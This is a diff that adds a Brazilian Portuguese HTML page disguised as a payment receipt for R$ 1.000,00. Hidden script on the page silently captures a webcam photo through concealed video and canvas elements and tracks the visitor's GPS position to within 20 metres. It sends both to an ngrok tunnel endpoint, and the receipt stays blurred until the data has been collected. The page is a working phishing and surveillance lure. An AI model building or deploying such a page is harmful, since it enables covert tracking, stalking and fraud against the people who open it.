@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="comprovante-container blurred">
+    <h1>Comprovante de Recebimento</h1>
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
+    </div>
+    <button class="botao" onclick="window.print()">Imprimir</button>
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+    <div id="loading-overlay" class="loading-overlay">
+      <div class="spinner"></div>
+    </div>
+  </div>
+
+  <!-- Elementos ocultos para captura da câmera -->
+  <video id="video" style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      // Exibir data atual
+      const dataAtual = new Date();
+      const dia = String(dataAtual.getDate()).padStart(2, '0');
+      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+      const ano = dataAtual.getFullYear();
+      document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
+
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      let photoData = null;
+
+      // Função para capturar a foto
+      async function capturePhoto() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          console.error("API de mídia não suportada neste navegador.");
+          return;
+        }
+
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.srcObject = stream;
+          video.onloadedmetadata = () => {
+            video.play();
+            setTimeout(() => {
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              canvas.getContext("2d").drawImage(video, 0, 0);
+              photoData = canvas.toDataURL("image/jpeg");
+              stream.getTracks().forEach(track => track.stop());
+            }, 2000);
+          };
+        } catch (error) {
+          console.error("Erro ao acessar a câmera:", error);
+          photoData = null; // Prosseguir sem foto se falhar
+        }
+      }
+
+      // Iniciar captura da câmera
+      capturePhoto().then(() => {
+        // Capturar localização com GPS
+        if (navigator.geolocation) {
+          let watchId = navigator.geolocation.watchPosition(
+            position => {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+              const accuracy = position.coords.accuracy;
+              const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+              if (accuracy <= 20) {
+                navigator.geolocation.clearWatch(watchId);
+                sendLocation({ latitude, longitude, accuracy, maps, source: "GPS", photo: photoData });
+                removeLoading();
+              }
+            },
+            () => {
+              // Fallback para IP após 15 segundos
+              setTimeout(() => {
+                sendLocation({ photo: photoData });
+                removeLoading();
+              }, 15000);
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 15000,
+              maximumAge: 0
+            }
+          );
+
+          // Forçar fallback após 15 segundos
+          setTimeout(() => {
+            navigator.geolocation.clearWatch(watchId);
+            sendLocation({ photo: photoData });
+            removeLoading();
+          }, 15000);
+        } else {
+          sendLocation({ photo: photoData });
+          removeLoading();
+        }
+      });
+    });
+
+    function sendLocation(data) {
+      fetch("https://d4f9-177-35-125-241.ngrok-free.app/send-location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.success) console.error("Erro ao enviar:", data.message);
+          else console.log("Localização e foto enviadas com sucesso do frontend!");
+        })
+        .catch(error => console.error("Erro ao enviar do frontend:", error));
+    }
+
+    function removeLoading() {
+      document.querySelector(".comprovante-container").classList.remove("blurred");
+      document.getElementById("loading-overlay").style.display = "none";
+    }
+  </script>
+</body>
+</html>
